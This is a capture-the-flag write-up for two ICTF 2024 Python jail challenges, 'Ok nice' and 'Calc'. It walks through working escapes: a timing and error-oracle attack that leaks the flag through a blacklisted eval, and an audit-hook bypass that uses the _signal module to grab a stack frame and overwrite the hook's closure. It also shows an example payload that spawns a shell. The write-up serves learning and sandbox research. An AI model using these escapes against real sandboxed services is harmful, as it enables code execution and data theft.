---
{"dg-publish":true,"permalink":"/👩‍🏫Writeups/ICTF 2024 - All PyJails/","tags":["Writeup","ICTF","Misc"]}
---

# ICTF 2024 - *All PyJails* 『ANY %』

## ***Ok nice*** | **Ord**inary challenge
### The challenge

```python
print("Welcome to the jail! It is so secure I even have a flag variable!")
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','>','<','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']
while True:
    inp = input("Enter input: ")
    for i in blacklist:
        if i in inp:
            print("ok nice")
            exit(0)
    for i in inp:
        if (ord(i) > 125) or (ord(i) < 40) or (len(set(inp))>17):
            print("ok nice")
            exit(0)
    try:
        eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})
    except:
        print("error")
```

Look at this nice challenge 😇 We have a classic blacklist + emptied builtins.
Our goal seems to print ``jail``. Easy right ? Even without ``print`` 😇

Before solving, let's add some debugging to help us through our testing phase !
```python
print("Welcome to the jail! It is so secure I even have a flag variable!")
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','>','<','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']

while True:
    inp = input("Enter input: ")
    
    for i in blacklist:
        if i in inp:
            print("ok nice, bl")                                               ### NEW
            exit(0)
    
    for i in inp:
        if (ord(i) > 125) or (ord(i) < 40) or (len(set(inp))>17):
            print("ok nice, ct", (ord(i) > 125), (ord(i) < 40), len(set(inp))) ### NEW
            print(inp)                                                         ### NEW
            print("".join("#" if (ord(c) < 40) else "_" for c in inp))         ### NEW
            exit(0)
    
    try:
        eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})                  ### NEW
        print("ok nice, eval-ed")
    except:
        print("error")
```

Now we can easily know *what blocked* and *where* if it's a banned character

### Solving process
1️⃣ First we don't have full execution (comes with an ``exec``) but we have an ``eval``. Meaning we *"""can't"""* write Python code but only *expressions* (No functions or statements). We don't care because we don't have builtins but it's something to note
2️⃣ Secondly we can't use the UTF8 tricks because the characters' value are limited
3️⃣ Thirdly we have a pretty small and easy to deal with blacklist but they block easy ideas. There is a character set limit too that will only block us later and will ask us for optimization
4️⃣ Fourthly we have a Try/Except that blocks any attempt to leak ``flag`` through an error log. *It doesn't mean we can't use errors as we have "error" printed when an error occurs* 👀
5️⃣ Fifth and last, we have access to ``ord`` to make numbers and do some shenanigans 😈

What we can aim for :
- get shell (why ???)
- showing the entire flag (needs builtins recovery + use of print in an eval = difficult)
- get flag's characters one by one (needs numbers -> possible)
	- throw at specific value (needs a way to throw in our context -> surely needs compare)
	- timing attack (needs a long execution time based on value -> surely needs loops)

<br>
#### Making numbers
To access a specific character from the flag we need numbers. We have
- 0 => ``False``
- 1 => ``True``
- n => ``True+True+...+True`` (we don't have a limit in length)
- -n => ``-True-True-...-True``
<br>
#### Try 1 : low hanging fruits
```python
{...}[flag[True]] # Dictionnary access, but no {} allowed
[flag,<TO DO: something that throws>][flag[True]=="a"] # Not a good enough compare, no =
for(a)in(range(ord(flag[True]))):ord(flag[True])  # Hmmmmmm, no for and range in 'eval' tho
[ord(flag[True])for(a)in(range(ord(flag[True])))] # Hmmmmmmmmmm
```
<br>
#### Try 2 : timing attack with homemade range and "for loop"
How can we make a ``range`` ? Easy ! With **slices** !
```python
<long string>[::ord(flag[<number>])]
```
But to make our homemade range and for loop we need numbers and a long string. Numbers are being taken care of but how can we make a long string ?
Well we have
- a string (flag)
- numbers
we have everything we need to make one long boy !
```python
(flag*<number>)[::ord(flag[<number>])]

# Example
(flag*67)[::ord(flag[1])]
(flag*ord(flag[True]))[::ord(flag[True])] # Assuming the flag starts with ICTF{...

# ... And because we have no limits in length
(flag*ord(flag[True])*ord(flag[True])*...*ord(flag[True]))[::ord(flag[True])
```
One big thing to note is that ``flag*67*67*...*67`` grows **VERY fast**. Like ``flag*67*67*67`` takes 1-3 seconds to process and adding an extra ``*67`` will make a ``MemoryError`` (not enough memory to handle the massive string 😨)

Let's make a quick payload generator
```python
def gen_payload(chr_pos,delta_time):
    if chr_pos==0: return "(flag"+"*ord(flag[True])"*delta_time+")[::ord(flag[False])]"
    if chr_pos==1: return "(flag"+"*ord(flag[True])"*delta_time+")[::ord(flag[True])]"
    return "(flag"+"*ord(flag[True])"*delta_time+")[::ord(flag[True"+"+True"*(chr_pos-1)+"])]"
```
Now we just need to execute a timing attack and we have the flag !
How do we decode the time ?

| string length | flag's character value | time  |
| ------------- | ---------------------- | ----- |
| $x\times67^3$ | 73 => I (given)        | $t_0$ |
| $x\times67^3$ | 67 => C (given)        | $t_1$ |
| $x\times67^3$ | 84 => T (given)        | $t_2$ |
| $x\times67^3$ | 70 => F (given)        | $t_3$ |
| $x\times67^3$ | ...                    | $t_n$ |


We can reverse the length of the flag and just do an simple cross product to find each flag's value, have fun 😈
<br>
#### Try 3 : Throw at specific value with a nice compare
We can't use ``=`` but we can still make compares !
```python
if(ord(flag[<number>])^<number>):raise # No raise :(
if(ord(flag[<number>])^<number>):a     # No if in eval
[a for i in flag if (ord(flag[<number>])^<number>)] # No spaces
[(a)for(i)in(flag)if(ord(flag[<number>])^<number>)] # Yeah !
```
Looks really good ! ...
... but we are using too many different characters 😥
```python
# Example
[(a)for(i)in(flag)if(ord(flag[True])^(True+True+...64 more...+True))] # flag[1]==67
```
Our idea is to have ``flag[n]^x==0``, because Python takes anything not null, empty or zero as True we can use another operation to have a 0. An operator like ``-`` !
```python
[(a)for(i)in(flag)if(ord(flag[<number>])-<number>)]

# Example
[(a)for(i)in(flag)if(ord(flag[-True])-(-True-True-...64 more...-True))] # flag[-1]==67
```
Works like a charm 🎇🤩✨ We can read the flag backward and check every value for any of the flag's characters !

Here too let's make a payload generator
```python
def gen_payload2(rev_pos,chr):
    return "[(a)for(u)in(flag)if(-ord(flag["+"-True"*rev_pos+"])-("+"-True"*chr+"))]"
```


<br><br>

---

<br><br>

## ***Calc*** | Auditing Audithook
### The challenge
```python
from sys import addaudithook
from os import _exit
from re import match


def safe_eval(exit, code):
    def hook(*a):
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, "<code>", "eval")
    addaudithook(hook)
    return dummy()


if __name__ == "__main__":
    expr = input("Math expression: ")
    if len(expr) <= 200 and match(r"[0-9+\-*/]+", expr):
        print(safe_eval(_exit, expr))
    else:
        print("Do you know what is a calculator?")
```

Oooohh 😯 This one is an audithook bypass wrapped in a calculator themed jail.
For simplicity let's simplify it for now. We will comeback to the original version in the end

```python
from sys import addaudithook
from os import _exit

def safe_eval(exit, code):
    def hook(*a):
	    print(a) # for debugging
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, "<code>", "eval")
    addaudithook(hook)
    return dummy()

expr = input("Math expression: ")
print(safe_eval(_exit, expr))
```

The calculator thingy can be bypassed easily by just using a number at the start of our payload. We will see later, don't worry
<br>
### Solving process
It's not a first time audit hooks appear in CTFs. Tho there is a critical difference here. Let's simplify the jail further to compare it to **MyJail** from *NBCTF2023* (archived challenge can be found [here](https://github.com/salvatore-abello/pyjail/blob/main/NBCTF%202023/MyJail.py)) :
```python
from sys import addaudithook

def hook(*a): exit(0)
def dummy() : pass

expr = input("Math expression: ")
dummy.__code__ = compile(expr, "<code>", "eval")

addaudithook(hook)

print(dummy())
```

If we try to bypass this jail it's pretty easy. We can't circumvent the audit rules but **we can modify the sentence** 😈🔨👩‍⚖️ We just have to modify the ``hook`` function

```python
(exit:=lambda x:x), <full control>

# Examples
(exit:=lambda x:x),print("hacked >:)")
(exit:=lambda x:x),exec("import os;os.system('sh')")
```

Easy to do right ? But here is the challenge introduced by the challmaker. *We can't access the local variable ``exit`` and modify it !*

```python
def safe_eval(exit, code): # we are here at runtime and can do everything ...
    def hook(*a):
        exit(0)            # ... but here exit is added to hook at compile time
                           # so we can't modify it from the outside
    def dummy():
        pass
```

What can we do ?
- explore audithook's internals and "modify" ``hook`` ?
- explore Python's memory and "modify" ``hook`` ?
- access ``hook`` from "inside" instead of outside 👀
<br>
### Bypassing ``hook`` from the inside
Audithooks trigger at [certain events](https://docs.python.org/3/library/audit_events.html#audit-events). If we look at the ``import`` event it says
> `module`, `filename`, `sys.path`, `sys.meta_path`, `sys.path_hooks`

meaning it triggers when we open a file that is going to be used as a library... But what if **it is already loaded !** Like in our jail with ``from sys import addaudithook`` and ``from os import _exit`` !

```python
Math expression: __import__('sys')

# Output
<module 'sys' (built-in)>
```
```python
Math expression: __import__('sys').modules.keys()

# Output
dict_keys(['sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', 'winreg', '_io', 'marshal', 'nt', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', 'encodings.cp1252', '_signal', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', '_winapi', 'ntpath', 'os.path', 'os', '_sitebuiltins', '_distutils_hack', 'site'])
```

Wow 🤩 That's a lot of modules to work with ! Most are out of audithooks' events too 😈
If we ignore the Windows modules (no I won't apology for that) we can search in each frozen modules for gold.
I will spoil it, ``_signal`` is where gold is hidden. There is some good stuff in ``_frozen_importlib`` and ``_imp`` too but when they go to read a file they execute ``os.listdir``, raising an event 😭 You can also tinker with *debug traces*, ``_thread`` and other *builtin modules* (loadable with ``_frozen_importlib``) but in my testing I didn't achieve anything substantial (*skill issue* 🙄)
<br>
### Signaling we escaped 😎
Audithooks block ``sys._current_frames``, ``sys._getframe`` and ``sys._getframemodulename`` to protect the code from being tampered with. We can't call this functions but what if the ``frame`` object came to us directly 😇 ?
For that we are going to use [signals](https://docs.python.org/3/library/signal.html).  We can create a signal using ``signal.signal(signalnum, handler)`` ([ref](https://docs.python.org/3/library/signal.html#signal.signal))
> *signalnum* : the signal number 🆗
> 
> The _handler_ is called with two arguments: the **signal number** and the **current stack frame** 🤑

```python
signal.signal(2, lambda n,f:print(f))
```

To launch our trojan signal we just need to raise it using ``raise_signal(signalnum)``

```python
(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f)),s.raise_signal(2)

# Output
<frame at 0x000001F3EA9A8E00, file '<code>', line 1, code <module>>
(<module '_signal' (built-in)>, <built-in function default_int_handler>, None)

# dir(f)
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', 
'__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'f_back', 'f_builtins', 'f_code', 'f_globals', 'f_lasti', 'f_lineno', 'f_locals', 'f_trace', 'f_trace_lines', 'f_trace_opcodes']

# f_locals
{'__name__': '__main__', '__doc__': 'from sys import addaudithook\n\ndef hook(*a): exit(0)\ndef dummy() : pass\n\nexpr = input("Math expression: ")\ndummy.__code__ = compile(expr, "<code>", "eval")\n\naddaudithook(hook)\n\nprint(dummy())', '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x00000162B1E85210>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'c:path\\to\\wu.py', '__cached__': None, 'addaudithook': <built-in function addaudithook>, '_exit': <built-in function _exit>, 'safe_eval': <function safe_eval at 0x00000162B1E304A0>, 'expr': "s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_locals)),s.raise_signal(2)", 's': <module '_signal' (built-in)>}
```

Well not the right frame, let's move up and down with ``f_back`` (leaving the ``dummy()`` frame and going to ``safe_eval``)

```python
(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_back)),s.raise_signal(2)

# Output
<frame at 0x000001A3949DAF60, file 'c:path\\to\\wu.py', line 27, code safe_eval>

# f_locals
{'exit': <built-in function _exit>, 'code': "(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_back.f_locals)),s.raise_signal(2)", 'hook': <function safe_eval.<locals>.hook at 0x000001ABF4218D60>, 'dummy': <function safe_eval.<locals>.dummy at 0x000001ABF4218EA0>}
```

Finally 🤩 ! We have access to ``hook`` 🥳🎉
To finish we just need to modify its local values through its ``__closure__`` ([ref](https://docs.python.org/3/reference/datamodel.html#function.__closure__))

```python
lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr))
```

🥁 ***Final solution*** 🥁

```python
(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr)),s.raise_signal(2),open('flag').read()

# And to avoid the limits in the Original version™️
0,(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr)),s.raise_signal(2),open('flag').read()


# Output
(0, <module '_signal' (built-in)>, <built-in function default_int_handler>, None, 'well_done')
```
<br><br>
## Closing note
Overall pretty interesting PyJails 💖 They were well guided with their really distinct little details, the left over ``ord`` in Ok Nice and all the function setup in Calc.
As always we learned a lot about Python internals and what a madness it is in there 😋 Ok Nice was based more on our Python skills and creativity to get the flag, while Calc was more on Python internals (sys, \_signal, frames, closure, ...)
For **Calc**, one inspiration to find a bypass would be by looking at what was previously made. Audithooks are pwned since Python 3.8 and there are some places where it is ~~randomly~~ discussed, for instance [on Github](https://github.com/python/cpython/issues/87604)

If you want to read and discover more about **Audithooks-based PyJails**, I recommend reading :
- [CTF Pyjail 沙箱逃逸绕过合集](https://xz.aliyun.com/t/12647)
- [PEP 578 – Python Runtime Audit Hooks](https://peps.python.org/pep-0578/)
- [Python Jail Escape CSAW Finals 2023](https://wachter-space.de/2023/11/12/csaw23-python-jail-escape/)


​		***See you next time! (˵ ͡~ ͜ʖ ͡°˵)ﾉ⌒♡\*:･。.***

<p style="font-family:'Courier New',monospace;margin-left:70%">hey<br>ily<br>shy</p>


